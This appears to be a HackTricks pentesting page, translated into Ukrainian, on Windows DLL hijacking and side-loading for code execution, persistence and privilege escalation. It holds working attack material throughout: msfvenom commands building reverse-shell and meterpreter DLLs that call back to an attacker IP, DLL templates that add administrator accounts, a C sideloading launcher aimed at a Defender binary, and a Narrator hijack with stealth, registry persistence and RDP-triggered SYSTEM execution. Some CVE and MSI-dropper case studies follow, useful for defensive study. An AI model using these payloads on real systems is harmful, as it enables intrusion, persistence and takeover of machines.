# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking передбачає маніпуляції з довіреним застосунком, щоб той завантажив шкідливий DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Він здебільшого використовується для виконання коду, досягнення persistence і, рідше, privilege escalation. Незалежно від акценту на escalation у цьому розділі, методика hijacking-а залишається послідовною для різних цілей.

### Поширені техніки

Існує декілька методів DLL hijacking, ефективність кожного залежить від стратегії завантаження DLL конкретного застосунку:

1. **DLL Replacement**: Заміна справжнього DLL на шкідливий, опційно використовуючи DLL Proxying для збереження функціоналу оригінального DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливого DLL у шляху пошуку перед легітимним, експлуатуючи шаблон пошуку застосунку.
3. **Phantom DLL Hijacking**: Створення шкідливого DLL, який застосунок спробує завантажити, думаючи, що це відсутній необхідний DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як `%PATH%` або `.exe.manifest` / `.exe.local` файли, щоб спрямувати застосунок на шкідливий DLL.
5. **WinSxS DLL Replacement**: Замінювання легітимного DLL на шкідливий у каталозі WinSxS — метод часто пов'язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливого DLL у директорії, що контролюється користувачем, разом із скопійованим застосунком, подібно до технік Binary Proxy Execution.

## Finding missing Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals і **встановити** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і просто показати **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **missing dlls in general**, залиште procmon працювати на кілька **секунд**.\
Якщо ви шукаєте **missing dll** всередині конкретного виконуваного файлу, слід додати ще один фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати його і зупинити запис подій.

## Exploiting Missing Dlls

Щоб виконати privilege escalation, найкращий шанс — мати можливість **записати dll, який процес з підвищеними привілеями спробує завантажити** у одному з **місць, де його буде шукати**. Отже, ми можемо **записати** dll у **папку**, де **dll шукають раніше**, ніж у папці з **оригінальним dll** (рідкісний випадок), або мати змогу **записати в якусь папку, де dll буде шукатися**, і в жодній папці немає оригінального **dll**.

### Порядок пошуку DLL

У [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) можна знайти детальний опис того, як саме завантажуються Dlls.

Windows applications шукають DLL, слідуючи набору заздалегідь визначених шляхів пошуку у певному порядку. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщується в одному з таких каталогів так, що він завантажується перед автентичним DLL. Рішення для запобігання цьому — забезпечити, щоб застосунок використовував абсолютні шляхи при зверненні до потрібних DLL.

Нижче наведено порядок пошуку DLL на 32-bit системах:

1. Директорія, з якої було завантажено застосунок.
2. Системний каталог. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу.(_C:\Windows\System32_)
3. 16-bit системний каталог. Для цього каталогу немає функції, що повертає його шлях, але він також перевіряється. (_C:\Windows\System_)
4. Каталог Windows. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу.
1. (_C:\Windows_)
5. Поточна директорія.
6. Директорії, перелічені у змінній оточення PATH. Зауважте, що це не включає шлях, специфічний для застосунку, вказаний ключем реєстру **App Paths**. Ключ **App Paths** не використовується при обчисленні шляху пошуку DLL.

Це **за замовчуванням** порядок пошуку при увімкненому SafeDllSearchMode. Коли він відключений, поточна директорія піднімається на друге місце. Щоб відключити цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо викликається функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) з прапором **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в директорії виконуваного модуля, який завантажує LoadLibraryEx.

Нарешті, зауважте, що dll може бути завантажений із вказанням абсолютного шляху замість просто імені. У такому випадку цей dll буде шукатися лише за цим шляхом (якщо у dll є залежності, вони будуть шукатися як завантажені за іменем).

Існують інші способи змінити порядок пошуку, але тут я їх не описуватиму.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL у новоствореному процесі — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Поставивши сюди директорію, контрольовану атакуючим, цільовий процес, який вирішує імпортований DLL за іменем (без абсолютного шляху і без використання safe loading прапорів), може бути змушений завантажити шкідливий DLL з цієї директорії.

Ключова ідея
- Побудувати process parameters за допомогою RtlCreateProcessParametersEx і вказати кастомний DllPath, що вказує на вашу керовану папку (наприклад, директорія, де знаходиться ваш dropper/unpacker).
- Створити процес за допомогою RtlCreateUserProcess. Коли цільовий бінар вирішує DLL за ім'ям, лоадер звернеться до цього наданого DllPath під час вирішення, що дозволяє надійне sideloading навіть коли шкідливий DLL не знаходиться поруч з ціллю EXE.

Примітки/обмеження
- Це впливає на дочірній процес, що створюється; відрізняється від SetDllDirectory, який впливає лише на поточний процес.
- Ціль повинен імпортувати або викликати LoadLibrary для DLL за іменем (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко закодовані абсолютні шляхи не підлягають hijack-у. Forwarded exports і SxS можуть змінювати пріоритети.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Помістіть шкідливий xmllite.dll (експортує необхідні функції або проксирує на реальний) у ваш каталог DllPath.
- Запустіть підписаний бінарний файл, відомий тим, що шукає xmllite.dll за назвою, використовуючи вищевказану техніку. Завантажувач вирішує імпорт через зазначений DllPath і sideloads вашу DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

У документації Windows зазначені певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, що має ту ж назву, що й вже завантажений у пам'ять**, система оминає звичайний пошук. Натомість вона виконує перевірку на перенаправлення та маніфест перед тим, як повернутися до DLL, що вже знаходиться в пам'яті. **У цій ситуації система не виконує пошук DLL**.
- У випадках, коли DLL розпізнається як a **known DLL** для поточної версії Windows, система використовуватиме свою версію цієї known DLL разом із будь-якими її залежними DLL, **уникаючи процесу пошуку**. Регістрний ключ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список таких known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише своїми **іменами модулів**, незалежно від того, чи початкова DLL була ідентифікована через повний шлях.

### Escalating Privileges

**Requirements**:

- Визначте процес, який працює або буде працювати з **іншими привілеями** (horizontal or lateral movement), який **не має DLL**.
- Переконайтесь, що є **доступ на запис** для будь-якого **каталогу**, в якому буде **шукатися DLL**. Це місце може бути каталогом виконуваного файлу або каталогом у system path.

Так, вимоги складно знайти, оскільки **за замовчуванням дивно знайти привілейований виконуваний файл без DLL** і ще **більш дивно мати права запису у папку в system path** (за замовчуванням ви не маєте таких прав). Але в неправильно налаштованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте вимогам, перегляньте проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проєкту — bypass UAC**, ви можете знайти там **PoC** Dll hijaking для версії Windows, який можна використати (ймовірно, просто змінивши шлях до папки, де у вас є права запису).

Зауважте, що ви можете **перевірити свої дозволи в папці**, виконавши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити imports виконуваного файлу та exports dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права запису в будь-яку папку всередині system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll_.

### Example

Якщо ви знайдете експлойтибельний сценарій, однією з найважливіших умов для успішної експлуатації буде **створити dll, який експортує принаймні всі функції, які виконуваний файл імпортуватиме з нього**. Зауважте, що Dll Hijacking зручно використовувати для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або для [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **як створити валідний dll** у цьому дослідженні Dll Hijacking, орієнтованому на виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, в **наступній секції** ви знайдете кілька **базових dll-кодів**, які можуть бути корисними як **шаблони** або для створення **dll з експортованими необов’язковими функціями**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатний **виконати ваш шкідливий код при завантаженні**, але також **представлятися** і **працювати** як очікується, **перенаправляючи всі виклики до реальної бібліотеки**.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **вказати виконуваний файл і обрати бібліотеку**, яку хочете proxify, та **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив версії для x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Зверніть увагу, що в деяких випадках Dll, який ви компілюєте, повинен **export several functions**, які будуть завантажені victim process. Якщо ці функції не існують, то **binary won't be able to load** їх і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL приклад зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL з точкою входу для потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Приклад: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe при запуску все ще шукає передбачувану, специфічну для мови локалізаційну DLL, яка може бути hijacked для виконання довільного коду та persistence.

Ключові факти
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Виявлення за допомогою Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack буде говорити/підсвічувати UI. Щоб залишатися непоміченим, при приєднанні перераховуйте потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і `SuspendThread` його; продовжуйте у власному потоці. Див. PoC для повного коду.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище, запуск Narrator завантажує підкладений DLL. На secure desktop (logon screen) натисніть CTRL+WIN+ENTER щоб запустити Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться по RDP до хоста, на logon screen натисніть CTRL+WIN+ENTER щоб запустити Narrator; ваш DLL виконується як SYSTEM на secure desktop.
- Виконання припиняється при закритті RDP-сесії — inject/migrate оперативно.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати вбудований запис Accessibility Tool (AT) в реєстрі (наприклад, CursorIndicator), відредагувати його, щоб вказувати на довільний binary/DLL, імпортувати його, а потім встановити `configuration` на цю назву AT. Це дозволяє проксувати довільне виконання в рамках Accessibility.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM вимагають прав адміністратора.
- Вся логіка payload може бути в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Дослідження випадку: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

У цьому випадку продемонстровано **Phantom DLL Hijacking** у Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), відслідковано як **CVE-2025-1729**.

### Деталі вразливості

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Реалізація експлойту

Зловмисник може помістити шкідливий `hostfxr.dll` stub у той самий каталог, використовуючи відсутню DLL для досягнення виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Чекайте, поки плановане завдання запуститься о 9:30 під контекстом поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання завдання, шкідлива DLL запускається в сесії адміністратора з medium integrity.
4. З'єднайте стандартні UAC bypass техніки, щоб підвищити привілеї з medium integrity до SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers з DLL side-loading, щоб виконувати payloads під довіреним підписаним процесом.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- Таблиця CustomAction:
- Шукайте записи, які запускають executables або VBScript. Приклад підозрілої схеми: LaunchApplication, що виконує вбудований файл у фоновому режимі.
- В Orca (Microsoft Orca.exe) перегляньте таблиці CustomAction, InstallExecuteSequence та Binary.
- Embedded/split payloads in the MSI CAB:
- Адміністративне вилучення: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька малих фрагментів, які об'єднуються та розшифровуються VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичне sideloading за допомогою wsc_proxy.exe
- Помістіть ці два файли в одну й ту саму папку:
- wsc_proxy.exe: легітимний підписаний виконуваний файл (Avast). Процес намагається завантажити wsc.dll за іменем із тієї ж папки.
- wsc.dll: attacker DLL. Якщо не потрібні конкретні експорти, DllMain може бути достатнім; інакше створіть proxy DLL і перенаправте необхідні експорти до справжньої бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог щодо експорту використовуйте проксуючий фреймворк (наприклад, DLLirant/Spartacus) для генерації forwarding DLL, який також виконує ваш payload.

- Ця техніка спирається на DLL name resolution, виконуване host binary. Якщо хост використовує absolute paths або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS та forwarded exports можуть впливати на пріоритет і мають враховуватися при виборі host binary та export set.

## Посилання

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
